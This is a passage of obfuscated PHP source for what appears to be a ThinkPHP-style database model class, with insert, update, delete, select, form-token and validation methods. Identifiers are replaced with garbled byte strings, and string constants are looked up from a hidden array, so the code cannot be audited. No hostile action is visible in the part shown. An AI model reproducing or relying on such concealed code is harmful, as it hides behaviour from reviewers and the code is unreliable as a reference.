$this->error = think_lang($_SERVER[ÔÕ±ĞšÎ][350]); return !1; } } $êõ¶‚  = $this->_parseOptions($êõ¶‚ ); $­Ü‹‹† = $this->_facade($­Ü‹‹†); if (!1 === $this->_beforeInsert($­Ü‹‹†, $êõ¶‚ )) { return !1; } $ÇÄ±”ï = $this->db->insert($­Ü‹‹†, $êõ¶‚ , $ïÆó”ÃŒ); if (!1 !== $ÇÄ±”ï) { $ŞİşÍÂó = $this->getLastInsID(); if ($ŞİşÍÂó) { $­Ü‹‹†[$this->getPk()] = $ŞİşÍÂó; $this->_after_insert($­Ü‹‹†, $êõ¶‚ ); return $ŞİşÍÂó; } $this->_after_insert($­Ü‹‹†, $êõ¶‚ ); } return $ÇÄ±”ï; } protected function _beforeInsert(&$—¤Ê¥¯—, $ÇìÒ»–ı) { } protected function _after_insert($¹¨†şãî, $îü»¯£«) { } public function addAll($õıÇš÷û, $Ç×Ë‰ = array(), $±È°öŠ = false) { $—åàì»æ =& $_SERVER[ÔÕ±ĞšÎ]; if (empty($õıÇš÷û)) { $this->error = think_lang($—åàì»æ[350]); return !1; } $Ç×Ë‰ = $this->_parseOptions($Ç×Ë‰); foreach ($õıÇš÷û as $È…™ìòñ => $ªì…¯Ò¤) { $õıÇš÷û[$È…™ìòñ] = $this->_facade($ªì…¯Ò¤); } if (method_exists($this->db, $—åàì»æ[351])) { $Ğ‘Š‹¯Ü = $this->db->insertAll($õıÇš÷û, $Ç×Ë‰, $±È°öŠ); } else { $this->startTrans(); foreach ($õıÇš÷û as $È…™ìòñ => $ªì…¯Ò¤) { $Ğ‘Š‹¯Ü = $this->db->insert($ªì…¯Ò¤, $Ç×Ë‰, $±È°öŠ); } $this->commit(); } if (!1 !== $Ğ‘Š‹¯Ü) { $ÏùˆòˆÄ = $this->getLastInsID(); if ($ÏùˆòˆÄ) { return $ÏùˆòˆÄ; } } return $Ğ‘Š‹¯Ü; } public function selectAdd($ß¼ˆ×Óä = '', $”•ÛşşÊ = '', $ª«Ûõ„ = array()) { $æ‚¨û“ö =& $_SERVER[ÔÕ±ĞšÎ]; $ª«Ûõ„ = $this->_parseOptions($ª«Ûõ„); if (!1 === ($¹ğñá¾— = $this->db->selectInsert($ß¼ˆ×Óä ? $ß¼ˆ×Óä : $ª«Ûõ„[$æ‚¨û“ö[352]], $”•ÛşşÊ ? $”•ÛşşÊ : $this->getTableName(), $ª«Ûõ„))) { $this->error = think_lang($æ‚¨û“ö[353]); return !1; } else { return $¹ğñá¾—; } } public function save($¨İ½£ûğ = '', $°Á€®½“ = array()) { $Õ‹Ÿ¬Í» =& $_SERVER[ÔÕ±ĞšÎ]; if (empty($¨İ½£ûğ)) { if (!empty($this->data)) { $¨İ½£ûğ = $this->data; $this->data = array(); } else { $this->error = think_lang($Õ‹Ÿ¬Í»[350]); return !1; } } $¨İ½£ûğ = $this->_facade($¨İ½£ûğ); $°Á€®½“ = $this->_parseOptions($°Á€®½“); $“Ğš¬­€ = $this->getPk(); if (!isset($°Á€®½“[$Õ‹Ÿ¬Í»[354]])) { if (isset($¨İ½£ûğ[$“Ğš¬­€])) { $áõ„ØÃ[$“Ğš¬­€] = $¨İ½£ûğ[$“Ğš¬­€]; $°Á€®½“[$Õ‹Ÿ¬Í»[354]] = $áõ„ØÃ; unset($¨İ½£ûğ[$“Ğš¬­€]); } else { $this->error = think_lang($Õ‹Ÿ¬Í»[353]); return !1; } } if (is_array($°Á€®½“[$Õ‹Ÿ¬Í»[354]]) && isset($°Á€®½“[$Õ‹Ÿ¬Í»[354]][$“Ğš¬­€])) { $¯ÊêùÈ‡ = $°Á€®½“[$Õ‹Ÿ¬Í»[354]][$“Ğš¬­€]; } if (!1 === $this->_beforeUpdate($¨İ½£ûğ, $°Á€®½“)) { return !1; } $‚Ï¬¡Û‰ = $this->db->update($¨İ½£ûğ, $°Á€®½“); if (!1 !== $‚Ï¬¡Û‰) { if (isset($¯ÊêùÈ‡)) { $¨İ½£ûğ[$“Ğš¬­€] = $¯ÊêùÈ‡; } $this->_afterUpdate($¨İ½£ûğ, $°Á€®½“); } return $‚Ï¬¡Û‰; } protected function _beforeUpdate(&$´Ç«ó£Û, $±„í·ñÆ) { } protected function _afterUpdate($±ØŞ¦ú, $®‡ï™³†) { } public function delete($Ößå‰Å£ = array()) { $ƒö™ãŠ =& $_SERVER[ÔÕ±ĞšÎ]; if (empty($Ößå‰Å£) && empty($this->options[$ƒö™ãŠ[354]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $‚êÅÊÊ = $this->getPk(); if (is_numeric($Ößå‰Å£) || is_string($Ößå‰Å£)) { if (strpos($Ößå‰Å£, $ƒö™ãŠ[50])) { $û£®æà¥[$‚êÅÊÊ] = array($ƒö™ãŠ[355], $Ößå‰Å£); } else { $û£®æà¥[$‚êÅÊÊ] = $Ößå‰Å£; } $this->options[$ƒö™ãŠ[354]] = $û£®æà¥; } $Ößå‰Å£ = $this->_parseOptions(); if (is_array($Ößå‰Å£[$ƒö™ãŠ[354]]) && isset($Ößå‰Å£[$ƒö™ãŠ[354]][$‚êÅÊÊ])) { $¾™Ãêä¼ = $Ößå‰Å£[$ƒö™ãŠ[354]][$‚êÅÊÊ]; } $œ¦›°¢É = $this->db->delete($Ößå‰Å£); if (!1 !== $œ¦›°¢É) { $Ô´£øÅ = array(); if (isset($¾™Ãêä¼)) { $Ô´£øÅ[$‚êÅÊÊ] = $¾™Ãêä¼; } $this->_after_delete($Ô´£øÅ, $Ößå‰Å£); } return $œ¦›°¢É; } protected function _after_delete($İëÎ“ù, $Ôæ®î¤) { } public function select($®–—ßÕ = array()) { $à¬’¹¤Â =& $_SERVER[ÔÕ±ĞšÎ]; if (is_string($®–—ßÕ) || is_numeric($®–—ßÕ)) { $®Ä†«ş = $this->getPk(); if (strpos($®–—ßÕ, $à¬’¹¤Â[50])) { $¥ıĞ¨²”[$®Ä†«ş] = array($à¬’¹¤Â[355], $®–—ßÕ); } else { $¥ıĞ¨²”[$®Ä†«ş] = $®–—ßÕ; } $this->options[$à¬’¹¤Â[354]] = $¥ıĞ¨²”; } elseif (!1 === $®–—ßÕ) { $®–—ßÕ = $this->_parseOptions(); return $à¬’¹¤Â[356] . $this->db->buildSelectSql($®–—ßÕ) . $à¬’¹¤Â[357]; } $®–—ßÕ = $this->_parseOptions(); $¥¶ÏûÓ = $this->db->select($®–—ßÕ); if (!1 === $¥¶ÏûÓ) { return !1; } if (empty($¥¶ÏûÓ)) { return null; } $this->_afterSelect($¥¶ÏûÓ, $®–—ßÕ); return $¥¶ÏûÓ; } protected function _afterSelect(&$»‰·û¤¦, $Å—àÑ©) { } public function buildSql($ ô«‘‰• = array()) { $Ì¶”Ö…€ =& $_SERVER[ÔÕ±ĞšÎ]; $ ô«‘‰• = $this->_parseOptions($ ô«‘‰•); return $Ì¶”Ö…€[356] . $this->db->buildSelectSql($ ô«‘‰•) . $Ì¶”Ö…€[357]; } public function optionsValue($Ä´šÜšı = null) { if (is_null($Ä´šÜšı)) { return $this->options; } elseif (is_array($Ä´šÜšı)) { $this->options = array_merge($this->options, $Ä´šÜšı); } } protected function _parseOptions($¹«º’ = array()) { $¸ë·’½Ã =& $_SERVER[ÔÕ±ĞšÎ]; if (is_array($¹«º’)) { $¹«º’ = array_merge($this->options, $¹«º’); } $this->options = array(); if (!isset($¹«º’[$¸ë·’½Ã[358]])) { $¹«º’[$¸ë·’½Ã[358]] = $this->getTableName(); $¨”úóÒÒ = $this->fields; } else { $¨”úóÒÒ = $this->getDbFields(); } if (!empty($¹«º’[$¸ë·’½Ã[359]])) { $¹«º’[$¸ë·’½Ã[358]] .= $¸ë·’½Ã[53] . $¹«º’[$¸ë·’½Ã[359]]; } $¹«º’[$¸ë·’½Ã[360]] = $this->name; if (isset($¹«º’[$¸ë·’½Ã[354]]) && is_array($¹«º’[$¸ë·’½Ã[354]]) && !empty($¨”úóÒÒ) && !isset($¹«º’[$¸ë·’½Ã[361]]) && !isset($¹«º’[$¸ë·’½Ã[358]])) { foreach ($¹«º’[$¸ë·’½Ã[354]] as $Æğ¼ÇÃ => $­‰¢¸¢‹) { $Æğ¼ÇÃ = trim($Æğ¼ÇÃ); if (in_array($Æğ¼ÇÃ, $¨”úóÒÒ, !0)) { if (is_scalar($­‰¢¸¢‹)) { $this->_parseType($¹«º’[$¸ë·’½Ã[354]], $Æğ¼ÇÃ); } } elseif (!is_numeric($Æğ¼ÇÃ) && $¸ë·’½Ã[11] != substr($Æğ¼ÇÃ, 0, 1) && !1 === strpos($Æğ¼ÇÃ, $¸ë·’½Ã[10]) && !1 === strpos($Æğ¼ÇÃ, $¸ë·’½Ã[339]) && !1 === strpos($Æğ¼ÇÃ, $¸ë·’½Ã[214]) && !1 === strpos($Æğ¼ÇÃ, $¸ë·’½Ã[286])) { unset($¹«º’[$¸ë·’½Ã[354]][$Æğ¼ÇÃ]); } } } $this->_options_filter($¹«º’); return $¹«º’; } protected function _options_filter(&$Öµ®¸ŒÊ) { } protected function _parseType(&$Ô‰¶Œ§, $Ò×öÃáú) { $ò Â¯›ç =& $_SERVER[ÔÕ±ĞšÎ]; if (empty($this->options[$ò Â¯›ç[362]][$ò Â¯›ç[4] . $Ò×öÃáú])) { $˜½ÈÏ¦ø = strtolower($this->fields[$ò Â¯›ç[331]][$Ò×öÃáú]); if (!1 !== strpos($˜½ÈÏ¦ø, $ò Â¯›ç[363])) { } elseif (!1 === strpos($˜½ÈÏ¦ø, $ò Â¯›ç[364]) && !1 !== strpos($˜½ÈÏ¦ø, $ò Â¯›ç[365])) { $Ô‰¶Œ§[$Ò×öÃáú] = intval($Ô‰¶Œ§[$Ò×öÃáú]); } elseif (!1 !== strpos($˜½ÈÏ¦ø, $ò Â¯›ç[366]) || !1 !== strpos($˜½ÈÏ¦ø, $ò Â¯›ç[367])) { $Ô‰¶Œ§[$Ò×öÃáú] = floatval($Ô‰¶Œ§[$Ò×öÃáú]); } elseif (!1 !== strpos($˜½ÈÏ¦ø, $ò Â¯›ç[368])) { $Ô‰¶Œ§[$Ò×öÃáú] = (bool) $Ô‰¶Œ§[$Ò×öÃáú]; } } } public function find($—›Æ“Û² = array()) { $…ªË€÷ =& $_SERVER[ÔÕ±ĞšÎ]; if (is_numeric($—›Æ“Û²) || is_string($—›Æ“Û²)) { $†–²³Ì„[$this->getPk()] = intval($—›Æ“Û²); $this->options[$…ªË€÷[354]] = $†–²³Ì„; } $this->options[$…ªË€÷[369]] = 1; $—›Æ“Û² = $this->_parseOptions(); $’Å¦ëÀğ = $this->db->select($—›Æ“Û²); if (!1 === $’Å¦ëÀğ) { return !1; } if (empty($’Å¦ëÀğ)) { return null; } $this->data = $’Å¦ëÀğ[0]; $this->_afterFind($this->data, $—›Æ“Û²); if (!empty($this->options[$…ªË€÷[370]])) { return $this->returnResult($this->data, $this->options[$…ªË€÷[370]]); } return $this->data; } protected function _afterFind(&$Õ¶Ê€±ó, $¶èÂøÈ®) { } protected function returnResult($§†Şƒº¿, $İ†…»ë = '') { $üˆÆ—¿ =& $_SERVER[ÔÕ±ĞšÎ]; if ($İ†…»ë) { if (is_callable($İ†…»ë)) { return call_user_func($İ†…»ë, $§†Şƒº¿); } switch (strtolower($İ†…»ë)) { case $üˆÆ—¿[371]: return json_encode($§†Şƒº¿); case $üˆÆ—¿[372]: return xml_encode($§†Şƒº¿); } } return $§†Şƒº¿; } public function parseFieldsMap($éËŸÄ‚ò, $ ı¾ÚÎ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $«è±ÎÇè => $ÕæØÒÑ) { if ($ ı¾ÚÎ == 1) { if (isset($éËŸÄ‚ò[$ÕæØÒÑ])) { $éËŸÄ‚ò[$«è±ÎÇè] = $éËŸÄ‚ò[$ÕæØÒÑ]; unset($éËŸÄ‚ò[$ÕæØÒÑ]); } } else { if (isset($éËŸÄ‚ò[$«è±ÎÇè])) { $éËŸÄ‚ò[$ÕæØÒÑ] = $éËŸÄ‚ò[$«è±ÎÇè]; unset($éËŸÄ‚ò[$«è±ÎÇè]); } } } } return $éËŸÄ‚ò; } public function setField($­Ûİ¼££, $ÅÍî¥Ô = '') { if (is_array($­Ûİ¼££)) { $¡»à•Ñ = $­Ûİ¼££; } else { $¡»à•Ñ[$­Ûİ¼££] = $ÅÍî¥Ô; } return $this->save($¡»à•Ñ); } public function setAdd($©´Œ¯µŒ, $‡÷€¡ = 1) { $ŞŒ×”Ô¾ =& $_SERVER[ÔÕ±ĞšÎ]; $ÑÆ”ÕÂ = $©´Œ¯µŒ . $ŞŒ×”Ô¾[373] . $‡÷€¡; if ($‡÷€¡ < 0) { $ÑÆ”ÕÂ = $©´Œ¯µŒ . $‡÷€¡; } return $this->setField($©´Œ¯µŒ, array($ŞŒ×”Ô¾[374], $ÑÆ”ÕÂ)); } public function getField($„­Á‚Ñü, $·İ¹ŒÁ = null) { $úå†ãŸü =& $_SERVER[ÔÕ±ĞšÎ]; $çÁä‡¶Í[$úå†ãŸü[352]] = $„­Á‚Ñü; $çÁä‡¶Í = $this->_parseOptions($çÁä‡¶Í); $„­Á‚Ñü = trim($„­Á‚Ñü); if (strpos($„­Á‚Ñü, $úå†ãŸü[50])) { if (!isset($çÁä‡¶Í[$úå†ãŸü[369]])) { $çÁä‡¶Í[$úå†ãŸü[369]] = is_numeric($·İ¹ŒÁ) ? $·İ¹ŒÁ : $úå†ãŸü[12]; } $£ÉªœóÆ = $this->db->select($çÁä‡¶Í); if (!empty($£ÉªœóÆ)) { $Ï²³™õš = explode($úå†ãŸü[50], $„­Á‚Ñü); $„­Á‚Ñü = array_keys($£ÉªœóÆ[0]); $×³¸ğÅ™ = array_shift($„­Á‚Ñü); $¾®£ë¹ = array_shift($„­Á‚Ñü); $Èç³’Ëº = array(); $–åèÙ‚ß = count($Ï²³™õš); foreach ($£ÉªœóÆ as $¡’ÕÄØ›) { $Áåœş©¨ = $¡’ÕÄØ›[$×³¸ğÅ™]; if (2 == $–åèÙ‚ß) { $Èç³’Ëº[$Áåœş©¨] = $¡’ÕÄØ›[$¾®£ë¹]; } else { $Èç³’Ëº[$Áåœş©¨] = is_string($·İ¹ŒÁ) ? implode($·İ¹ŒÁ, $¡’ÕÄØ›) : $¡’ÕÄØ›; } } return $Èç³’Ëº; } } else { if (!0 !== $·İ¹ŒÁ) { $çÁä‡¶Í[$úå†ãŸü[369]] = is_numeric($·İ¹ŒÁ) ? $·İ¹ŒÁ : 1; } if ($·İ¹ŒÁ === $úå†ãŸü[334]) { unset($çÁä‡¶Í[$úå†ãŸü[369]]); } $¡’ÕÄØ› = $this->db->select($çÁä‡¶Í); if (!empty($¡’ÕÄØ›)) { if ($·İ¹ŒÁ === $úå†ãŸü[334]) { return reset($¡’ÕÄØ›[0]); } if (!0 !== $·İ¹ŒÁ && 1 == $çÁä‡¶Í[$úå†ãŸü[369]]) { return reset($¡’ÕÄØ›[0]); } foreach ($¡’ÕÄØ› as $¿Æ¼ª’) { $ºê®Ø„[] = $¿Æ¼ª’[$„­Á‚Ñü]; } return $ºê®Ø„; } } return null; } public function create($ô¸¼æª› = '', $½ğß¹† = '') { $ŒËûë  =& $_SERVER[ÔÕ±ĞšÎ]; if (empty($ô¸¼æª›)) { $ô¸¼æª› = $_POST; } elseif (is_object($ô¸¼æª›)) { $ô¸¼æª› = get_object_vars($ô¸¼æª›); } if (empty($ô¸¼æª›) || !is_array($ô¸¼æª›)) { $this->error = think_lang($ŒËûë [350]); return !1; } $ô¸¼æª› = $this->parseFieldsMap($ô¸¼æª›, 0); $½ğß¹† = $½ğß¹† ? $½ğß¹† : (!empty($ô¸¼æª›[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ŒËûë [352]])) { $™šÉ£ = $this->options[$ŒËûë [352]]; unset($this->options[$ŒËûë [352]]); } elseif ($½ğß¹† == THINK_MODEL_INSERT && isset($this->insertFields)) { $™šÉ£ = $this->insertFields; } elseif ($½ğß¹† == THINK_MODEL_UPDATE && isset($this->updateFields)) { $™šÉ£ = $this->updateFields; } if (isset($™šÉ£)) { if (is_string($™šÉ£)) { $™šÉ£ = explode($ŒËûë [50], $™šÉ£); } if (think_config($ŒËûë [375])) { $™šÉ£[] = think_config($ŒËûë [376]); } foreach ($ô¸¼æª› as $“Ò¿Ú÷´ => $Ÿü›³«—) { if (!in_array($“Ò¿Ú÷´, $™šÉ£)) { unset($ô¸¼æª›[$“Ò¿Ú÷´]); } } } if (!$this->autoValidation($ô¸¼æª›, $½ğß¹†)) { return !1; } if (!$this->autoCheckToken($ô¸¼æª›)) { $this->error = think_lang($ŒËûë [377]); return !1; } if ($this->autoCheckFields) { $™šÉ£ = $this->getDbFields(); foreach ($ô¸¼æª› as $“Ò¿Ú÷´ => $Ÿü›³«—) { if (!in_array($“Ò¿Ú÷´, $™šÉ£)) { unset($ô¸¼æª›[$“Ò¿Ú÷´]); } elseif (MAGIC_QUOTES_GPC && is_string($Ÿü›³«—)) { $ô¸¼æª›[$“Ò¿Ú÷´] = stripslashes($Ÿü›³«—); } } } $this->autoOperation($ô¸¼æª›, $½ğß¹†); $this->data = $ô¸¼æª›; return $ô¸¼æª›; } public function autoCheckToken($¯Ïè©¸›) { $áï³—‘± =& $_SERVER[ÔÕ±ĞšÎ]; if (isset($this->options[$áï³—‘±[378]]) && !$this->options[$áï³—‘±[378]]) { return !0; } if (think_config($áï³—‘±[375])) { $òöªî¶Ø = think_config($áï³—‘±[376]); if (!isset($¯Ïè©¸›[$òöªî¶Ø]) || Session::get($òöªî¶Ø)) { return !1; } list($Ñæöı×, $Ã¼ÈÔ¯) = explode($áï³—‘±[11], $¯Ïè©¸›[$òöªî¶Ø]); if ($Ã¼ÈÔ¯ && Session::get($òöªî¶Ø . $áï³—‘±[10] . $Ñæöı×) === $Ã¼ÈÔ¯) { Session::remove($òöªî¶Ø . $áï³—‘±[10] . $Ñæöı×); return !0; } if (think_config($áï³—‘±[379])) { Session::remove($òöªî¶Ø . $áï³—‘±[10] . $Ñæöı×); } return !1; } return !0; } public function regex($üØŞ®µŠ, $Ó¿ó„á¥) { $Âåß¡ÎÉ =& $_SERVER[ÔÕ±ĞšÎ]; $ø©Å¼÷á = array($Âåß¡ÎÉ[380] => $Âåß¡ÎÉ[381], $Âåß¡ÎÉ[382] => $Âåß¡ÎÉ[383], $Âåß¡ÎÉ[384] => $Âåß¡ÎÉ[385], $Âåß¡ÎÉ[386] => $Âåß¡ÎÉ[387], $Âåß¡ÎÉ[388] => $Âåß¡ÎÉ[389], $Âåß¡ÎÉ[390] => $Âåß¡ÎÉ[391], $Âåß¡ÎÉ[392] => $Âåß¡ÎÉ[393], $Âåß¡ÎÉ[367] => $Âåß¡ÎÉ[394], $Âåß¡ÎÉ[395] => $Âåß¡ÎÉ[396]); if (isset($ø©Å¼÷á[strtolower($Ó¿ó„á¥)])) { $Ó¿ó„á¥ = $ø©Å¼÷á[strtolower($Ó¿ó„á¥)]; } return preg_match($Ó¿ó„á¥, $üØŞ®µŠ) === 1; } private function autoOperation(&$ó¤¸áçÔ, $¦íˆî¶) { $Ø¨Î¬ì½ =& $_SERVER[ÔÕ±ĞšÎ]; if (!empty($this->options[$Ø¨Î¬ì½[397]])) { $µÒ‚ÚÈÁ = $this->options[$Ø¨Î¬ì½[397]]; unset($this->options[$Ø¨Î¬ì½[397]]); } elseif (!empty($this->_auto)) { $µÒ‚ÚÈÁ = $this->_auto; } if (isset($µÒ‚ÚÈÁ)) { foreach ($µÒ‚ÚÈÁ as $ø»ì°ĞÂ) { if (empty($ø»ì°ĞÂ[2])) { $ø»ì°ĞÂ[2] = THINK_MODEL_INSERT; } if ($¦íˆî¶ == $ø»ì°ĞÂ[2] || $ø»ì°ĞÂ[2] == THINK_MODEL_BOTH) { switch (trim($ø»ì°ĞÂ[3])) { case $Ø¨Î¬ì½[398]: case $Ø¨Î¬ì½[399]: $ù–Ÿ¾ùº = isset($ø»ì°ĞÂ[4]) ? (array) $ø»ì°ĞÂ[4] : array(); if (isset($ó¤¸áçÔ[$ø»ì°ĞÂ[0]])) { array_unshift($ù–Ÿ¾ùº, $ó¤¸áçÔ[$ø»ì°ĞÂ[0]]); } if ($Ø¨Î¬ì½[398] == $ø»ì°ĞÂ[3]) { $ó¤¸áçÔ[$ø»ì°ĞÂ[0]] = call_user_func_array($ø»ì°ĞÂ[1], $ù–Ÿ¾ùº); } else { $ó¤¸áçÔ[$ø»ì°ĞÂ[0]] = call_user_func_array(array(&$this, $ø»ì°ĞÂ[1]), $ù–Ÿ¾ùº); } break; case $Ø¨Î¬ì½[352]: $ó¤¸áçÔ[$ø»ì°ĞÂ[0]] = $ó¤¸áçÔ[$ø»ì°ĞÂ[1]]; break; case $Ø¨Î¬ì½[400]: if ($Ø¨Î¬ì½[12] === $ó¤¸áçÔ[$ø»ì°ĞÂ[0]]) { unset($ó¤¸áçÔ[$ø»ì°ĞÂ[0]]); } break; case $Ø¨Î¬ì½[401]: default: $ó¤¸áçÔ[$ø»ì°ĞÂ[0]] = $ø»ì°ĞÂ[1]; } if (!1 === $ó¤¸áçÔ[$ø»ì°ĞÂ[0]]) { unset($ó¤¸áçÔ[$ø»ì°ĞÂ[0]]); } } } } return $ó¤¸áçÔ; } protected function autoValidation($õå¿˜³ö, $‰ÙÂÔ¾½) { $êÖö‡‰Ã =& $_SERVER[ÔÕ±ĞšÎ]; if (!empty($this->options[$êÖö‡‰Ã[402]])) { $‰Ñ³¥Üû = $this->options[$êÖö‡‰Ã[402]]; unset($this->options[$êÖö‡‰Ã[402]]); } elseif (!empty($this->_validate)) { $‰Ñ³¥Üû = $this->_validate; } if (isset($‰Ñ³¥Üû)) { if ($this->patchValidate) { $this->error = array(); } foreach ($‰Ñ³¥Üû as $âÆïöåâ => $š÷Á‡¢ı) { if (empty($š÷Á‡¢ı[5]) || $š÷Á‡¢ı[5] == THINK_MODEL_BOTH || $š÷Á‡¢ı[5] == $‰ÙÂÔ¾½) { if (0 == strpos($š÷Á‡¢ı[2], $êÖö‡‰Ã[403]) && strpos($š÷Á‡¢ı[2], $êÖö‡‰Ã[404])) { $š÷Á‡¢ı[2] = think_lang(substr($š÷Á‡¢ı[2], 2, -1)); } $š÷Á‡¢ı[3] = isset($š÷Á‡¢ı[3]) ? $š÷Á‡¢ı[3] : THINK_EXISTS_VALIDATE; $š÷Á‡¢ı[4] = isset($š÷Á‡¢ı[4]) ? $š÷Á‡¢ı[4] : $êÖö‡‰Ã[405]; switch ($š÷Á‡¢ı[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($õå¿˜³ö, $š÷Á‡¢ı)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($êÖö‡‰Ã[12] != trim($õå¿˜³ö[$š÷Á‡¢ı[0]])) { if (!1 === $this->_validationField($õå¿˜³ö, $š÷Á‡¢ı)) { return !1; } } break; default: if (isset($õå¿˜³ö[$š÷Á‡¢ı[0]])) { if (!1 === $this->_validationField($õå¿˜³ö, $š÷Á‡¢ı)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($½ÏÛÒÃ, $¼ôíÙÙ ) { if (!1 === $this->_validationFieldItem($½ÏÛÒÃ, $¼ôíÙÙ )) { if ($this->patchValidate) { $this->error[$¼ôíÙÙ [0]] = $¼ôíÙÙ [2]; } else { $this->error = $¼ôíÙÙ [2]; return !1; } } return; } protected function _validationFieldItem($Å±ÆÛŞÄ, $Úİ•è˜) { $¶ÊÂ¹Ğ¼ =& $_SERVER[ÔÕ±ĞšÎ]; switch (strtolower(trim($Úİ•è˜[4]))) { case $¶ÊÂ¹Ğ¼[398]: case $¶ÊÂ¹Ğ¼[399]: $×—ˆ«ú± = isset($Úİ•è˜[6]) ? (array) $Úİ•è˜[6] : array(); if (is_string($Úİ•è˜[0]) && strpos($Úİ•è˜[0], $¶ÊÂ¹Ğ¼[50])) { $Úİ•è˜[0] = explode($¶ÊÂ¹Ğ¼[50], $Úİ•è˜[0]); } if (is_array($Úİ•è˜[0])) { foreach ($Úİ•è˜[0] as $‡µé“‘É) { $ÏÍòÈĞ[$‡µé“‘É] = $Å±ÆÛŞÄ[$‡µé“‘É]; } array_unshift($×—ˆ«ú±, $ÏÍòÈĞ); } else { array_unshift($×—ˆ«ú±, $Å±ÆÛŞÄ[$Úİ•è˜[0]]); } if ($¶ÊÂ¹Ğ¼[398] == $Úİ•è˜[4]) { return call_user_func_array($Úİ•è˜[1], $×—ˆ«ú±); } else { return call_user_func_array(array(&$this, $Úİ•è˜[1]), $×—ˆ«ú±); } case $¶ÊÂ¹Ğ¼[406]: return $Å±ÆÛŞÄ[$Úİ•è˜[0]] == $Å±ÆÛŞÄ[$Úİ•è˜[1]]; case $¶ÊÂ¹Ğ¼[407]: if (is_string($Úİ•è˜[0]) && strpos($Úİ•è˜[0], $¶ÊÂ¹Ğ¼[50])) { $Úİ•è˜[0] = explode($¶ÊÂ¹Ğ¼[50], $Úİ•è˜[0]); } $†ç‰Êô— = array(); if (is_array($Úİ•è˜[0])) { foreach ($Úİ•è˜[0] as $‡µé“‘É) { $†ç‰Êô—[$‡µé“‘É] = $Å±ÆÛŞÄ[$‡µé“‘É]; } } else { $†ç‰Êô—[$Úİ•è˜[0]] = $Å±ÆÛŞÄ[$Úİ•è˜[0]]; } if (!empty($Å±ÆÛŞÄ[$this->getPk()])) { $†ç‰Êô—[$this->getPk()] = array($¶ÊÂ¹Ğ¼[408], $Å±ÆÛŞÄ[$this->getPk()]); } if ($this->where($†ç‰Êô—)->find()) { return !1; } return !0; default: return $this->check($Å±ÆÛŞÄ[$Úİ•è˜[0]], $Úİ•è˜[1], $Úİ•è˜[4]); } } public function check($ù›ıõ‘, $ªñı«Ú³, $”´»œÈß = "\162\x65\x67\145\x78") { $æ°Î¿£Š =& $_SERVER[ÔÕ±ĞšÎ]; $”´»œÈß = strtolower(trim($”´»œÈß)); switch ($”´»œÈß) { case $æ°Î¿£Š[7]: case $æ°Î¿£Š[409]: $±¨ÅÁÒ = is_array($ªñı«Ú³) ? $ªñı«Ú³ : explode($æ°Î¿£Š[50], $ªñı«Ú³); return $”´»œÈß == $æ°Î¿£Š[7] ? in_array($ù›ıõ‘, $±¨ÅÁÒ) : !in_array($ù›ıõ‘, $±¨ÅÁÒ); case $æ°Î¿£Š[410]: case $æ°Î¿£Š[411]: if (is_array($ªñı«Ú³)) { $—²Ÿ±Óë = $ªñı«Ú³[0]; $ë½×õ¦® = $ªñı«Ú³[1]; } else { list($—²Ÿ±Óë, $ë½×õ¦®) = explode($æ°Î¿£Š[50], $ªñı«Ú³); } return $”´»œÈß == $æ°Î¿£Š[410] ? $ù›ıõ‘ >= $—²Ÿ±Óë && $ù›ıõ‘ <= $ë½×õ¦® : $ù›ıõ‘ < $—²Ÿ±Óë || $ù›ıõ‘ > $ë½×õ¦®; case $æ°Î¿£Š[412]: case $æ°Î¿£Š[413]: return $”´»œÈß == $æ°Î¿£Š[412] ? $ù›ıõ‘ == $ªñı«Ú³ : $ù›ıõ‘ != $ªñı«Ú³; case $æ°Î¿£Š[414]: $”§Ú¥ùí = mb_strlen($ù›ıõ‘, $æ°Î¿£Š[415]); if (strpos($ªñı«Ú³, $æ°Î¿£Š[50])) { list($—²Ÿ±Óë, $ë½×õ¦®) = explode($æ°Î¿£Š[50], $ªñı«Ú³); return $”§Ú¥ùí >= $—²Ÿ±Óë && $”§Ú¥ùí <= $ë½×õ¦®; } else { return $”§Ú¥ùí == $ªñı«Ú³; } case $æ°Î¿£Š[416]: list($¬ä»Òï¡, $õíµØ¬Ñ) = explode($æ°Î¿£Š[50], $ªñı«Ú³); if (!is_numeric($¬ä»Òï¡)) { $¬ä»Òï¡ = strtotime($¬ä»Òï¡); } if (!is_numeric($õíµØ¬Ñ)) { $õíµØ¬Ñ = strtotime($õíµØ¬Ñ); } return NOW_TIME >= $¬ä»Òï¡ && NOW_TIME <= $õíµØ¬Ñ; case $æ°Î¿£Š[417]: return in_array(get_client_ip(), explode($æ°Î¿£Š[50], $ªñı«Ú³)); case $æ°Î¿£Š[418]: return !in_array(get_client_ip(), explode($æ°Î¿£Š[50], $ªñı«Ú³)); case $æ°Î¿£Š[405]: default: return $this->regex($ù›ıõ‘, $ªñı«Ú³); } } public function query($ØÕÕÆ, $‹£™İÀ§ = false) { $—™ÕõïÈ =& $_SERVER[ÔÕ±ĞšÎ]; if (!is_bool($‹£™İÀ§) && !is_array($‹£™İÀ§)) { $‹£™İÀ§ = func_get_args(); array_shift($‹£™İÀ§); } $ØÕÕÆ = str_replace(array($—™ÕõïÈ[287], $—™ÕõïÈ[419]), $—™ÕõïÈ[53], $ØÕÕÆ); $ØÕÕÆ = $this->parseSql($ØÕÕÆ, $‹£™İÀ§); return $this->db->query($ØÕÕÆ); } public function execute($º™¢¸Ì¨, $Ÿ›·ÌÚö = false) { if (!is_bool($Ÿ›·ÌÚö) && !is_array($Ÿ›·ÌÚö)) { $Ÿ›·ÌÚö = func_get_args(); array_shift($Ÿ›·ÌÚö); } $º™¢¸Ì¨ = $this->parseSql($º™¢¸Ì¨, $Ÿ›·ÌÚö); return $this->db->execute($º™¢¸Ì¨); } protected function parseSql($üµß‡™, $šğ¬ªİ¸) { $ùÉàÆü =& $_SERVER[ÔÕ±ĞšÎ]; if (!0 === $šğ¬ªİ¸) { $½¿âƒÕ÷ = $this->_parseOptions(); $üµß‡™ = $this->db->parseSql($üµß‡™, $½¿âƒÕ÷); } elseif (is_array($šğ¬ªİ¸)) { $šğ¬ªİ¸ = array_map(array($this->db, $ùÉàÆü[420]), $šğ¬ªİ¸); $üµß‡™ = 